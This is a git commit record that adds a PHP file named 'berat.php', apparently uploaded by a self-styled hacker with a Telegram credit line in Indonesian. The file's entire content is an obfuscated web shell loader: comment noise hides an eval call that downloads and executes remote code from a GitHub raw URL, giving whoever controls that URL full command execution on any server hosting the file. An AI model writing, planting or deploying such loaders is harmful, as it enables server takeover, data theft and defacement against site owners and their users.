0d84b2ab68c9760b70e7ded9babeff3fd1e7ce9d
whiterose7777 <anonymous.ind777@gmail.com>
2024-11-05 00:02:21 +0700

    Add files via upload

---
+++ berat.php
@@ -0,0 +1,3 @@
+<?=/**/@null; /**/ /*/ /**/@eval/**/ ("?>".file_get_contents (rawurldecode(urldecode("https://raw.githubusercontent.com/ClayHaxor/alfah/master/alfah1")))); /**/ ?>
+
+eittsss.... dilarang kopas kode form/destahaxor /@haxorqt telegram
